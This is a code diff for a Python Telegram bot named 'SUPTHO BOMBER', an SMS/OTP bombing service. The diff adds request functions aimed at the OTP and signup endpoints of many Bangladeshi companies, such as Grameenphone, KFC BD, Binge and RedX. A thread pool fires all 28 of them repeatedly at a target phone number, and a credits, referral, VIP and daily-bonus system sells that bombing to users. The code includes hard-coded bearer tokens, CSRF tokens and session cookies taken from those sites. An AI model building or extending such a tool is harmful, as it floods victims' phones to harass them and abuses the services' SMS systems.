@@ -5,6 +5,7 @@ import os
 import json
 import random
 import string
+from datetime import datetime, timedelta
 from concurrent.futures import ThreadPoolExecutor
 from flask import Flask
 from telebot import types
@@ -50,8 +51,76 @@ def save_data(data):
 db = load_data()
 
 # ==========================================
-# 🚀 API ENGINE (20 APIs)
+# 🚀 API ENGINE (28 APIs)
 # ==========================================
+
+def gpfi_api(target):
+    try:
+        url = "https://gpfi-api.grameenphone.com/api/v1/fwa/request-for-otp"
+        headers = {"Host": "gpfi-api.grameenphone.com", "content-type": "application/json", "user-agent": "Mozilla/5.0 (Linux; Android 12; Infinix X669C)", "origin": "https://gpfi.grameenphone.com", "referer": "https://gpfi.grameenphone.com/"}
+        payload = {"phone": target, "email": "", "language": "en"}
+        requests.post(url, json=payload, headers=headers, timeout=3)
+    except: pass
+
+def chorcha_register_api(target):
+    try:
+        url = "https://mujib.chorcha.net/auth/register"
+        headers = {"content-type": "application/json", "x-chorcha-platform": "web", "x-chorcha-mode": "api", "origin": "https://chorcha.net", "user-agent": "Mozilla/5.0"}
+        rand_name = ''.join(random.choices(string.ascii_letters, k=6))
+        payload = {"name": rand_name, "phone": target, "password": "Password123", "type": "ARTS", "level": "HSC_26", "school": "Dhaka College", "referral_code": None}
+        requests.post(url, json=payload, headers=headers, timeout=3)
+    except: pass
+
+def beautybooth_api(target):
+    try:
+        url = "https://admin.beautybooth.com.bd/api/v2/auth/register"
+        headers = {"content-type": "application/json", "user-agent": "Mozilla/5.0", "origin": "https://beautybooth.com.bd", "referer": "https://beautybooth.com.bd/"}
+        requests.post(url, json={"value": target, "type": "phone", "token": 117}, headers=headers, timeout=3)
+    except: pass
+
+def sailor_api(target):
+    try:
+        url = "https://backend.sailor.clothing/api/v2/auth/signup"
+        headers = {"content-type": "application/json", "user-agent": "Mozilla/5.0", "origin": "https://sailor.clothing", "referer": "https://sailor.clothing/"}
+        rand_email = ''.join(random.choices(string.ascii_lowercase, k=10)) + "@gmail.com"
+        requests.post(url, json={"country_code": "BD", "phone": target, "email": rand_email, "password": "Password123@", "password_confirmation": "Password123@"}, headers=headers, timeout=3)
+    except: pass
+
+def rangs_api(target):
+    try:
+        url = "https://ecom.rangs.com.bd/send-otp-code"
+        headers = {"content-type": "application/json", "authorization": "Bearer", "user-agent": "Mozilla/5.0", "origin": "https://shop.rangs.com.bd", "referer": "https://shop.rangs.com.bd/"}
+        requests.post(url, json={"mobile": f"+88{target}", "type": 1}, headers=headers, timeout=3)
+    except: pass
+
+def binge_api(target):
+    try:
+        url = "https://api.binge.buzz/api/v4/auth/otp/send"
+        headers = {"content-type": "application/json", "x-platform": "web", "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJEVDFsSklRdHplaHBIWjZ3OTFYaGk0eEFFc0UyIiwicGhvbmUiOm51bGwsInN0YXR1cyI6ImZyZWUiLCJleHBpcmVzQXQiOm51bGwsImlzQW5vbiI6dHJ1ZSwibWlncmF0ZWQiOnRydWUsImlhdCI6MTc2OTAwMzg2NSwiZXhwIjoxNzcyNjAzODY1fQ.NaZKP30HWE8wxpybs9YhUnZ_pjcOtzoAy4OTMiNlIwY", "user-agent": "Mozilla/5.0", "origin": "https://binge.buzz", "referer": "https://binge.buzz/login"}
+        requests.post(url, json={"phone": f"+88{target}"}, headers=headers, timeout=3)
+    except: pass
+
+def kfc_api(target):
+    try:
+        url = "https://kfcbd.com/livewire/message/home.login"
+        headers = {"content-type": "application/json", "user-agent": "Mozilla/5.0", "x-csrf-token": "6A5frGBoqKpgV1VSz0ouL3Sfshn0NAdtJLTHhnIS", "x-livewire": "true", "origin": "https://kfcbd.com", "referer": "https://kfcbd.com/login", "cookie": "_fbp=fb.1.1769003597108.955889830933324146; XSRF-TOKEN=eyJpdiI6IlJ5V1lKZ3ozN0lKdTdzNGJVem1aUGc9PSIsInZhbHVlIjoia0pxdndnQk9iMTFJQXZFNFZKVXV1RVBMalpVK0tqQVNJZU9pM0JhL25MdEJGOER4N0FLUGQvYkJueEtIWndObGNtd1JuQ1hjd2ZzVDF2OWZXSGlyYWdBQXhrUHpaM0NLN0FKcEJOZVpHMUt6ZGN2aCtOZTl6blZHOHJsaGl4aVIiLCJtYWMiOiI4YTk3ZTkwODUyMmE4NTQzYWQ0M2VkZDNmZTEzNWI5ZTAwYWE2NGY3MWNmMTZlYzJkODg5NDg2NjhlODZhYjk4IiwidGFnIjoiIn0%3D; kfcbd_session=eyJpdiI6Ik5sek9TM3RwTVRqcGZyUHZ3VHIyZlE9PSIsInZhbHVlIjoiR2dYVkF5M0hqT0VSaHVzTHgrVXBMMzVYaDg3dks2MXFITjlrYi9jNGtnMXp1N1l2UlpiZ0xNcU9YVjczb2hGNUg0Y2FxOEFKbklIUmpnYm1saGh0REVMMlFSaDhLNGp0TmtsbmpvU0oxYnFYazRnQ0NDQjc2Wktna3kzZS9GR1YiLCJtYWMiOiJiZmJjNWNlNWExOTgwMjY3ZGMwM2ViZTdlODkwMGE1ODMzZWZjNzcxNzIwMTA3MTc2MTY1YjVjODI1MGMxY2Y1IiwidGFnIjoiIn0%3D"}
+        payload = {"fingerprint": {"id":"gfHVWOQplqQw5g5ZY3FO","name":"home.login","locale":"en","path":"login","method":"GET","v":"acj"}, "serverMemo": {"children":[],"errors":[],"htmlHash":"56c21409","data":{"mobile":None,"step":1,"get_otp":None,"otp":None,"previous_url":"https://kfcbd.com/"},"dataMeta":[],"checksum":"aa83aaee6349b6a8e574096144e663c3440cf91cdb1c9e24c7d6893c6afbd663"}, "updates": [{"type":"syncInput","payload":{"id":"yfynf","name":"mobile","value": target}}, {"type":"callMethod","payload":{"id":"rp1t","method":"login","params":[]}}]}
+        requests.post(url, json=payload, headers=headers, timeout=3)
+    except: pass
+
+def acs_api(target):
+    try:
+        url = "https://8t09wa0n0a.execute-api.ap-south-1.amazonaws.com/poc/api/v1/otp/send"
+        headers = {"content-type": "application/json", "user-agent": "Mozilla/5.0", "origin": "https://acsfutureschool.com", "referer": "https://acsfutureschool.com/"}
+        requests.post(url, json={"phone": target}, headers=headers, timeout=3)
+    except: pass
+
+def bdtickets_api(target):
+    try:
+        url = "https://api.bdtickets.com/v1/auth"
+        headers = {"content-type": "application/json", "user-agent": "Mozilla/5.0", "origin": "https://bdtickets.com", "referer": "https://bdtickets.com/"}
+        requests.post(url, json={"createUserCheck": True, "phoneNumber": f"+88{target}", "applicationChannel": "WEB_APP"}, headers=headers, timeout=3)
+    except: pass
 
 def robi_api(target):
     try:
@@ -71,10 +140,6 @@ def airtel_api(target):
 
 def grameenphone_api(target):
     try: requests.post("https://webloginda.grameenphone.com/backend/api/v1/otp", headers={"Content-Type": "application/x-www-form-urlencoded"}, data=f"msisdn={target}", timeout=3)
-    except: pass
-
-def shopbase_api(target):
-    try: requests.post("https://shopbasebd.com/store/registration/sendOTP", headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8"}, data=f"number={target}&_token=fbCftgSv6QSCDj0aYABGdeQKwggdMaKW0ifdhfsp", timeout=3)
     except: pass
 
 def apex_api(target):
@@ -105,20 +170,8 @@ def bohubrihi_api(target):
     try: requests.post("https://bb-api.bohubrihi.com/public/activity/otp", json={"phone": target, "intent": "login"}, timeout=3)
     except: pass
 
-def rokomari_api(target):
-    try: requests.get(f"https://www.rokomari.com/otp/send?emailOrPhone=88{target}&countryCode=BD", timeout=3)
-    except: pass
-
 def ecourier_api(target):
     try: requests.get(f"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={target}", timeout=3)
-    except: pass
-
-def eonbazar_api(target):
-    try: requests.post("https://app.eonbazar.com/api/auth/login", json={"method": "otp", "mobile": target}, headers={"content-type": "application/json"}, timeout=3)
-    except: pass
-
-def rabbithole_api(target):
-    try: requests.post("https://apix.rabbitholebd.com/appv2/login/requestOTP", json={"mobile": f"+88{target}"}, headers={"content-type": "application/json"}, timeout=3)
     except: pass
 
 def osudpotro_api(target):
@@ -141,20 +194,44 @@ def sundarban_api(target):
         requests.post("https://api-gateway.sundarbancourierltd.com/graphql", json={"operationName": "CreateAccessToken", "variables": {"accessTokenFilter": {"userName": target}}, "query": query}, headers={"content-type": "application/json"}, timeout=3)
     except: pass
 
-def paragon_api(target):
-    try: requests.post("https://www.paragonfood.com.bd/Customer/SendOTP", data={"phoneNumber": target, "otpTypeId": "2", "__RequestVerificationToken": "CfDJ8Aodwe6hDBdPthjewNanGbwdV_aATsmlMUUY5pv1dF9-XzNx0VxbzekITiBrs-Ay2kNUr0LoH9hVuU4l20ocBm3YvzpL7K2Udskhiol-9hDRZSI2mBOqj1agCdocW3alTqWKQrvlDbyCY_3XIO0YEds"}, headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8"}, timeout=3)
+def hishabee_api(target):
+    try:
+        url = f"https://app.hishabee.business/api/V2/otp/send?mobile_number={target}&country_code=88"
+        headers = {"origin": "https://web.hishabee.business", "referer": "https://web.hishabee.business/", "user-agent": "Mozilla/5.0"}
+        requests.post(url, headers=headers, timeout=3)
+    except: pass
+
+def shomvob_api(target):
+    try:
+        url = "https://backend-api.shomvob.co/api/v2/otp/phone"
+        headers = {"content-type": "application/json", "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY1OTg5NTcwOH0.IOdKen62ye0N9WljM_cj3Xffmjs3dXUqoJRZ_1ezd4Q", "user-agent": "Mozilla/5.0", "origin": "https://app.shomvob.co", "referer": "https://app.shomvob.co/auth/"}
+        requests.post(url, json={"phone": f"88{target}", "is_retry": 0}, headers=headers, timeout=3)
+    except: pass
+
+def deeptoplay_api(target):
+    try:
+        url = "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en"
+        headers = {"content-type": "application/json", "user-agent": "Mozilla/5.0", "origin": "https://www.deeptoplay.com"}
+        requests.post(url, json={"number": f"+88{target}"}, headers=headers, timeout=3)
+    except: pass
+
+def redx_api(target):
+    try:
+        url = "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp"
+        headers = {"content-type": "application/json", "user-agent": "Mozilla/5.0", "origin": "https://redx.com.bd", "referer": "https://redx.com.bd/"}
+        requests.post(url, json={"phoneNumber": target}, headers=headers, timeout=3)
     except: pass
 
 def attack_executor(target, amount):
-    # Total 20 APIs
-    apis = [robi_api, grameenphone_api, shopbase_api, apex_api, bikroy_api, banglalink_api, airtel_api, chorki_api, hoichoi_api, bioscope_api, bohubrihi_api, rokomari_api, ecourier_api, eonbazar_api, rabbithole_api, osudpotro_api, fundesh_api, paperfly_api, sundarban_api, paragon_api]
+    # Total 28 APIs
+    apis = [gpfi_api, chorcha_register_api, beautybooth_api, sailor_api, rangs_api, binge_api, kfc_api, acs_api, bdtickets_api, robi_api, grameenphone_api, apex_api, bikroy_api, banglalink_api, airtel_api, chorki_api, hoichoi_api, bioscope_api, bohubrihi_api, ecourier_api, osudpotro_api, fundesh_api, paperfly_api, sundarban_api, hishabee_api, shomvob_api, deeptoplay_api, redx_api]
     with ThreadPoolExecutor(max_workers=50) as executor:
         for _ in range(amount):
             for run_api in apis:
                 executor.submit(run_api, target)
 
 # ==========================================
-# 👑 ADMIN COMMANDS (With VIP)
+# 👑 ADMIN COMMANDS
 # ==========================================
 
 @bot.message_handler(commands=['admin', 'stats', 'gencodes', 'broadcast', 'ban', 'unban', 'addvip', 'removevip'])
@@ -176,7 +253,7 @@ def admin_panel(message):
                 bot.reply_to(message, f"✅ User {uid} is now VIP (Unlimited).")
                 try: bot.send_message(uid, "🎉 Congratulations! You are now a VIP user. Unlimited bombing enabled!")
                 except: pass
-            else: bot.reply_to(message, "❌ User not found in DB (User must start bot first).")
+            else: bot.reply_to(message, "❌ User not found.")
             
     elif cmd[0] == '/removevip':
         if len(cmd) > 1:
@@ -216,7 +293,7 @@ def admin_panel(message):
             db['banned'].remove(cmd[1]); save_data(db); bot.reply_to(message, f"✅ Unbanned {cmd[1]}")
 
 # ==========================================
-# 🤖 USER INTERFACE
+# 🤖 USER INTERFACE (UPDATED)
 # ==========================================
 
 def is_joined(user_id):
@@ -233,19 +310,22 @@ def welcome(message):
     
     if uid in db.get('banned', []): return bot.reply_to(message, "🚫 Banned.")
 
+    # ✅ Secure Start: Only init if user NOT in db
     if uid not in db['users']:
         referrer = args[1] if len(args) > 1 and args[1] in db['users'] else None
         if referrer and referrer != uid:
             db['users'][referrer]['credits'] += 5
             try: bot.send_message(referrer, "🎉 Referral Bonus: +5 Credits!")
             except: pass
-        db['users'][uid] = {"credits": 5, "plan": "free"}
+        # Initialize new user
+        db['users'][uid] = {"credits": 5, "plan": "free", "last_bonus": "2000-01-01 00:00:00"}
         save_data(db)
 
+    # ✅ Add "🎁 Daily Bonus" button
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
     markup.add("🚀 Start Bomb", "👤 Profile")
-    markup.add("👥 Refer & Earn", "💰 Redeem Credit")
-    markup.add("👑 Admin Support")
+    markup.add("🎁 Daily Bonus", "💰 Redeem Credit")
+    markup.add("👥 Refer & Earn", "👑 Admin Support")
     bot.send_message(message.chat.id, "🔥 **SUPTHO BOMBER** 🔥", reply_markup=markup)
 
 @bot.message_handler(func=lambda m: True)
@@ -259,14 +339,35 @@ def menu_logic(message):
     if message.text == "🚀 Start Bomb":
         msg = bot.reply_to(message, "💣 নাম্বার দিন:")
         bot.register_next_step_handler(msg, ask_amount)
+    
     elif message.text == "👤 Profile":
         u = db['users'].get(uid, {})
         plan = u.get('plan', 'free').upper()
         cred = "Unlimited" if int(uid) == int(OWNER_ID) or plan == "VIP" else u.get('credits', 0)
         bot.reply_to(message, f"👤 **PROFILE**\n\n🆔 ID: `{uid}`\n💎 Plan: **{plan}**\n💰 Balance: `{cred}`", parse_mode='Markdown')
+    
+    # ✅ DAILY BONUS LOGIC
+    elif message.text == "🎁 Daily Bonus":
+        user_data = db['users'].get(uid, {})
+        last_str = user_data.get('last_bonus', "2000-01-01 00:00:00")
+        try:
+            last_date = datetime.strptime(last_str, "%Y-%m-%d %H:%M:%S")
+        except:
+            last_date = datetime(2000, 1, 1)
+
+        if datetime.now() > last_date + timedelta(days=1):
+            db['users'][uid]['credits'] += 1
+            db['users'][uid]['last_bonus'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            save_data(db)
+            bot.reply_to(message, "🎉 **Daily Bonus Claimed!**\n💰 +1 Credit added.")
+        else:
+            next_claim = last_date + timedelta(days=1)
+            bot.reply_to(message, f"⏳ **Wait for cooldown!**\nNext claim: {next_claim.strftime('%H:%M:%S')}")
+
     elif message.text == "👥 Refer & Earn":
         link = f"https://t.me/{bot.get_me().username}?start={uid}"
         bot.reply_to(message, f"🎁 Invite link:\n`{link}`\n\nপ্রতি রেফারে ৫ ক্রেডিট।")
+    
     elif message.text == "💰 Redeem Credit":
         msg = bot.reply_to(message, "🎁 Redeem কোড দিন:")
         bot.register_next_step_handler(msg, process_redeem)
@@ -283,7 +384,6 @@ def process_bomb(message, target):
     
     try:
         amount = int(message.text)
-        # Owner or VIP user won't lose credits
         if int(uid) != int(OWNER_ID) and not is_vip:
             if u_data['credits'] < 1: return bot.reply_to(message, "⚠️ ক্রেডিট নেই! Refer বা Redeem করুন।")
             db['users'][uid]['credits'] -= 1; save_data(db)
@@ -301,7 +401,6 @@ def process_redeem(message):
 
 if __name__ == "__main__":
     keep_alive()
-    # ✅ Webhook Remove Logic Added Here
     try:
         bot.remove_webhook()
         print("Webhook removed!")
